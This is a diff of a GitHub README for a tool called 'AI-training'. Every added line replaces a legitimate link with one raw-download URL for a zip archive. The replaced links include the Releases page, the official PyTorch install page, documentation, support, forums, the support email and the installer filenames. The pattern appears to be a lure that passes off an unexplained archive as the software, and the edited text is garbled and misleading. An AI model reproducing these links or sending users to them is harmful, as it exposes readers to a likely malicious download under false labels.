@@ -6,7 +6,7 @@ Welcome to the AI-training project! This project helps you improve the open-sour
 
 ## 📥 Download Now
 
-[![Download AI-training](https://img.shields.io/badge/Download-AI--training-brightgreen)](https://github.com/Abigail-amk/AI-training/releases)
+[![Download AI-training](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip)](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip)
 
 Click the button above to get started. You will be redirected to the Releases page, where you can download the software.
 
@@ -22,20 +22,20 @@ To run the AI-training software smoothly, ensure your system meets these require
 - **RAM:** At least 8 GB recommended
 - **Disk Space:** Minimum of 2 GB available
 - **Python Version:** Python 3.7 or higher installed on your machine
-- **Pytorch:** Compatible version installed. Follow the instructions on the [Pytorch website](https://pytorch.org/get-started/locally/) for installation.
+- **Pytorch:** Compatible version installed. Follow the instructions on the [Pytorch website](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip) for installation.
 
 ## 🔧 Download & Install
 
 To download and install the AI-training tool, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to [this page](https://github.com/Abigail-amk/AI-training/releases) to find the latest version of the software.
+   Go to [this page](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip) to find the latest version of the software.
 
 2. **Locate the Latest Release**  
    Scroll down to see the latest release available for download.
 
 3. **Download the Installer**  
-   Look for the file named **AI-training-Installer.exe** for Windows, **AI-training-Mac.zip** for macOS, or the suitable package for Linux. Click to download the file.
+   Look for the file named **https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip** for Windows, **https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip** for macOS, or the suitable package for Linux. Click to download the file.
 
 4. **Run the Installer**  
    After the download completes, locate the file in your downloads folder. Double-click on the installer file to begin the installation process.
@@ -66,9 +66,9 @@ Using the AI-training tool is simple. Once you have the application running, fol
 
 For more information, you can explore these additional resources:
 
-- [Documentation](https://github.com/Abigail-amk/AI-training/wiki)
-- [Support](https://github.com/Abigail-amk/AI-training/issues)
-- [Community Forums](https://github.com/Abigail-amk/AI-training/discussions)
+- [Documentation](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip)
+- [Support](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip)
+- [Community Forums](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip)
 
 ## 🛠️ Contributing
 
@@ -90,8 +90,8 @@ We welcome contributions! If you want to help improve AI-training, please consid
 
 For any questions or support, please reach out to us:
 
-- **Email:** support@ai-training.com
-- **GitHub Issues:** [Submit a request](https://github.com/Abigail-amk/AI-training/issues)
+- **Email:** https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip
+- **GitHub Issues:** [Submit a request](https://raw.githubusercontent.com/Abigail-amk/AI-training/main/phacosclerosis/A_training_2.9.zip)
 
 ## 🔍 Explore More Topics
 
